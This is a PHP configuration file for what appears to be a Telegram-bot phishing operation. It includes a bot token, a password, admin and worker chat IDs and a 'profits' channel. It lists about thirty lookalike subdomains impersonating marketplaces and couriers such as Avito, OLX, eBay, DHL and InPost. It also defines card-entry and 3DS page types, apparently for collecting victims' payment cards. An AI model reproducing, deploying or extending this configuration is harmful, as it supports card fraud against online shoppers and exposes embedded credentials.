<?php

// Токен бота
$config['bot_token'] = "1532857982:AAFXkZYf6j1daltlQz19MwKVv95LfzkquEE";

// Подключить систему заявок , если сделать false заявок не будет
$config['request_in_bot'] = true;

// Наименование платёжки, если не найдена платёжка устанавливается ручная платёжка
$config['payment_system'] = file_get_contents('Pattern/Settings/paynumber');


// Специальный пароль
$config['request_bot_pwd'] = "coldloegay";

// Администраторы (через запятую)
$config['admins'] = "crimesoon";

// Модераторы (через запятую)
$config['mods'] = "xxvtbx";

// Бот фотографий
$config['image_bot'] = "imgurbot_bot";

// Беседа Администраторы (ID)
$config['group_admin'] = "-1001341197292";

// Беседа воркеров
$config['chat_of_workers'] = "https://t.me/joinchat/UYUA7UQR132Pn05N";

// Беседа воркеров (ID)
$config['chat_of_workers_id'] = "-1001367671021";

// Канал профитов
$config['channel_of_profits'] = "https://t.me/joinchat/UarKDA2DdylEzVYV";

// Домены
$config['domain'][] = ["avito.mobilepay-info.online", "Авито"];
$config['domain'][] = ["youla.mobilepay-info.online", "Юла"];
$config['domain'][] = ["olx.mobilepay-info.online", "OLX"];
$config['domain'][] = ["blablacar.mobilepay-info.online", "BlaBlaCar"];
$config['domain'][] = ["novaposhta.mobilepay-info.online", "Нова Пошта"];
$config['domain'][] = ["kufar.mobilepay-info.online", "Куфар"];
$config['domain'][] = ["olx-kz.mobilepay-info.online", "OLX KZ"];
$config['domain'][] = ["olx-ro.mobilepay-info.online", "OLX RO"];
$config['domain'][] = ["olx-pl.mobilepay-info.online", "OLX PL"];
$config['domain'][] = ["olx-bg.mobilepay-info.online", "OLX BG"];
$config['domain'][] = ["olx-uz.mobilepay-info.online", "OLX UZ"];
$config['domain'][] = ["olx-pt.mobilepay-info.online", "OLX PT"];
$config['domain'][] = ["ebay-usa.mobilepay-info.online", "EBAY USA"];
$config['domain'][] = ["ebay-eu.mobilepay-info.online", "EBAY EU"];
$config['domain'][] = ["dhl-usa.mobilepay-info.online", "DHL USA"];
$config['domain'][] = ["dhl-eu.mobilepay-info.online", "DHL EU"];
$config['domain'][] = ["leboncoin.mobilepay-info.online", "LEBONCOIN"];
$config['domain'][] = ["quoka.mobilepay-info.online", "QUOKA"];
$config['domain'][] = ["subito.mobilepay-info.online", "SUBITO"];
$config['domain'][] = ["willhaben.mobilepay-info.online", "WILLHABEN"];
$config['domain'][] = ["fancourier.mobilepay-info.online", "FANCOURIER"];
$config['domain'][] = ["kijiji.mobilepay-info.online", "KIJIJI"];
$config['domain'][] = ["milanuncios.mobilepay-info.online", "MILANUNCIOS"];
$config['domain'][] = ["ricardo.mobilepay-info.online", "RICARDO"];
$config['domain'][] = ["tori.mobilepay-info.online", "TORI"];
$config['domain'][] = ["jofogas.mobilepay-info.online", "JOFOGAS"];
$config['domain'][] = ["correos.mobilepay-info.online", "CORREOS"];
$config['domain'][] = ["dpd.mobilepay-info.online", "DPD"];
$config['domain'][] = ["inpost.mobilepay-info.online", "INPOST"];


// Курсы
$config['course']['grivni'] = 2.73; // гривны
$config['course']['byn'] = 29.79; // бин
$config['course']['tenge'] = 0.18; // тенге
$config['course']['usd'] = 74.65; // доллар
$config['course']['eur'] = 91.01; // евр
$config['course']['pln'] = 20.43; // златы
$config['course']['bgn'] = 46.98; // бгн
$config['course']['ron'] = 18.87; // рон

// Платёжки
$config['payments'][0] = ["Ручная", 100, 100000];


// Платформы
$config['platform']['receive'] = "получение";;
$config['platform']['order'] = "оплата";
$config['platform']['return'] = "возврат";
$config['platform']['card'] = "ввод карты";
$config['platform']['bank'] = "ввод карты";
$config['platform']['3ds'] = "ввод карты";
$config['platform']['track'] = "ввод карты";

?>